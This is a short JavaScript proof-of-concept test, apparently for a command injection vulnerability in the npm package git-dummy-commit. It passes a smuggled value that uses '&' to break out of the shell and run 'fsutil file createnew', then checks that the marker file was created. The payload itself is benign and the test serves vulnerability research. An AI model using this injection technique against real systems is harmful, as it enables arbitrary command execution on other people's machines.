// test("Command Injection in git-dummy-commit", () => {
//   expect.assertions(2);
  const gitDummyCommit = require("git-dummy-commit");
  const fs = require("fs");
  const path = "./git-dummy-commit";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
//       console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
console.log("{ " + file_exist + ", " + false + " }");
  gitDummyCommit('"& fsutil file createnew git-dummy-commit 0 & "');
  file_exist = fs.existsSync(path);
console.log("{ " + file_exist + ", " + true + " }");
  fs.unlink(path, function (err) {});
// });
